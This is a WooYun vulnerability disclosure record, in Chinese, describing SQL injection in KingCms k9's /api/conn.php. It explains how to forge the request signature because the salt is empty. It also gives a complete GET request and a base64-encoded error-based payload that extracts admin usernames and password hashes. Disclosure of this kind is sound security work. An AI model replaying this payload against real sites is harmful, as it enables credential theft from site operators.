{"id": 37021, "wybug_id": "wooyun-2015-0100601", "wybug_title": "KingCms最新版（k9）绕过过滤6处注入打包", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-11 11:59", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版（k9）绕过过滤6处注入打包 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9(2014-12-13更新)，官网下下来学习一下。在wooyun上看到了几个漏洞，如： WooYun: kingcms最新版sql注入漏洞 注入点：GET /api/conn.php?USERID=MTAwMDA%3D&data=U0VMRUNUIG1pZCxtbmFtZSxtdGFibGUgRlJPTSBraW5nX2NvbnRlbnRfbW9kZWwgVU5JT04gU0VMRUNUIDEgRlJPTShTRUxFQ1QgQ09VTlQoKiksQ09OQ0FUKDB4MjMsKFNFTEVDVCBjb25jYXQodXNlcm5hbWUsMHgyMyx1c2VycGFzcylGUk9NIGtpbmdfdXNlciBMSU1JVCAwLDEpLDB4MjMsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLnRhYmxlcyBHUk9VUCBCWSB4KWE%3d&jsoncallback=jsonp1426001109856&SIGN=9e64da1bfad93ed03ac42e0522cad92d&_=1426001137223 HTTP/1.1这个注入点比较奇怪，因为数据库执行的语句全部都由用户输入，虽然有注入过滤，但是base64_decode后轻松绕过了。注入参数：data_one,data,count,newid,getdir,getfile下面以data为例进行说明问题文件在/api/conn.php \n$str=new str;$db=new db;$file=new file;if(empty($get['SIGN'])) exit($jsoncallback.'('.json_encode(array('error'=>'丢失密文，禁止解析!')).')');//验证权限$sign=$get['SIGN'];unset($get['SIGN'],$get['_'],$get['jsoncallback']);$arr=array();foreach($get as $key => $val){\t$arr[$key]=$key.'='.urlencode($val);\t}ksort($arr);$param=implode('&',$arr);$sign1=md5($param.kc_config('system.salt'));if($sign!=$sign1) exit($jsoncallback.'('.json_encode(array('error'=>'审核失败,数据不一致!')).')');$arr=array();$get=array_map('base64_decode',$get);foreach($get as $key=>$val){\tif(substr($key,0,8)=='data_one'){\t\t$arr[$key]=$db->get_one($val);\t}elseif(substr($key,0,4)=='data'){\t\t\t\t$arr[$key]=$db->get($val);\t}elseif(substr($key,0,5)=='count'){\t\t$res=$db->get($val);\t\t$arr[$key]=empty($res[0]['c']) ? 0 : $res[0]['c'];\t}elseif(substr($key,0,5)=='newid'){\t\tlist($table,$id)=explode('|',$val,2);\t\t$arr[$key]=$db->newid($table,'',$id);\t}elseif(substr($key,0,6)=='getdir'){\t\tlist($path,$filetype)=explode('|',$val,2);\t\tif(empty($filetype)) $filetype='*';\t\t$arr[$key]=$file->getDir($path,$filetype);\t}elseif(substr($key,0,7)=='getfile'){\t\t$arr[$key]=$file->get($val);\t}elseif(substr($key,0,6)=='config'){\t\t$arr[$key]=kc_config($val);\t}elseif(substr($key,0,6)=='isfile'){\t\t$arr[$key]=is_file(ROOT.$val)?1:0;\t}}\n首先要绕过上面代码中的权限判断，其实就是计算出$sign1，然后使$_GET[‘SIGN’]与之相等即可。来看看$sign1是如何计算出来的\nforeach($get as $key => $val){\t$arr[$key]=$key.'='.urlencode($val);\t}ksort($arr);$param=implode('&',$arr);$sign1=md5($param.kc_config('system.salt'));\n参与计算的参数只有kc_config('system.salt')不是用户输入的，但是kingcms的这个参数是空，此因所有参与计算的参数都是用户输入的，按上面的算法简单计算一下就知道$sign1了，然后输入的$_GET[‘SIGN’]等于$sign1即可绕过权限判断。然后执行下面的代码，没有再过滤了\npublic function get($sql) {\t\t$res=array();\t\t$this->query($sql);\t\tif (empty($this->query_ID)) {\t\t\treturn array();\t\t}\t\t$rows=mysql_num_rows($this->query_ID);\t\tfor($i=0;$i<$rows;$i++) {\t\t\tif(!mysql_data_seek($this->query_ID,$i)) {\t\t\t\tkc_tip('<textarea>'.htmlspecialchars($_sql).'</textarea>');\t\t\t}\t\t\t$rs=mysql_fetch_array($this->query_ID);\t\t\tforeach ($rs as $k=>$r) {\t\t\t\tif (is_int($k) && $k!==0) {\t\t\t\t\tunset($rs[$k]);\t\t\t\t}\t\t\t}\t\t\t$res[$i]=$rs;\t\t}\t\t//释放资源\t\t$this->free();\t\treturn $res;\t}\n提交的payload要经过base64_decode处理，因此在提交前先base64_encode一下就可以了。Kingcms可以报错，因此编码前Payload：\nSELECT mid,mname,mtable FROM king_content_model UNION SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(username,0x23,userpass)FROM king_user LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a\n编码后Payload：\nU0VMRUNUIG1pZCxtbmFtZSxtdGFibGUgRlJPTSBraW5nX2NvbnRlbnRfbW9kZWwgVU5JT04gU0VMRUNUIDEgRlJPTShTRUxFQ1QgQ09VTlQoKiksQ09OQ0FUKDB4MjMsKFNFTEVDVCBjb25jYXQodXNlcm5hbWUsMHgyMyx1c2VycGFzcylGUk9NIGtpbmdfdXNlciBMSU1JVCAwLDEpLDB4MjMsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLnRhYmxlcyBHUk9VUCBCWSB4KWE%3d\n注入成功，见下图\n\n   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}